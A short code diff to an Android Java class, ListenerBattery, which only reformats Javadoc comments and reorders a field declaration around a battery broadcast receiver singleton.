@@ -21,17 +21,19 @@ import com.android.syssetup.auto.Cfg;
 import com.android.syssetup.util.Check;
 
 public class ListenerBattery extends Listener<Battery> {
-	/** The Constant TAG. */
+	/**
+	 * The Constant TAG.
+	 */
 	private static final String TAG = "ListenerBattery"; //$NON-NLS-1$
-
-	private BroadcastReceiver batteryReceiver;
-
-	/** The singleton. */
+	/**
+	 * The singleton.
+	 */
 	private volatile static ListenerBattery singleton;
+	private BroadcastReceiver batteryReceiver;
 
 	/**
 	 * Self.
-	 * 
+	 *
 	 * @return the status
 	 */
 	public static ListenerBattery self() {
